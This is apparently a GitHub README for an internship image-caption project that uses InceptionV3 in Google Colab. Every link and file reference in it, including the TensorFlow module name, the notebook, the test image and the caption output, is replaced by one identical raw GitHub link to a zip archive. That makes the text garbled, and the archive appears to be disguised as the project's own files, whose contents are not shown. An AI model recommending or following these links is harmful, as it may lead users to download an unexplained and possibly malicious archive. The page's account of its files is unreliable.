...
To extract meaningful features from the image, I used InceptionV3, a pre-trained Convolutional Neural Network available in TensorFlow’s https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip module. This network, originally designed for image classification, is repurposed here as a feature extractor. By removing its top classification layer, the model outputs a vector representation of the input image, capturing its essential visual characteristics.
...
I displayed the input image in the notebook alongside the generated caption to verify that the entire pipeline worked correctly. To make the result reusable and verifiable, I saved the generated caption into a text file named https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip and provided a download link in Colab so that the file could be retrieved easily. I also took a clear screenshot showing the uploaded image and the output caption, which I saved as https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip and included in my GitHub repository.
...
The entire project, including the Colab notebook (https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip), test image, output caption file, and the screenshot proof, is uploaded to my GitHub repository as evidence of successful implementation, fulfilling all requirements for Task 4 of my CodTech AI internship.

IMAGE USED



![Image](https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip)

OUTPUT:



[caption_output (2).txt](https://raw.githubusercontent.com/Mayank05GH/Task-4-Image-Caption-Generator/main/pseudoglottis/Caption_Task_Image_Generator_1.6.zip)
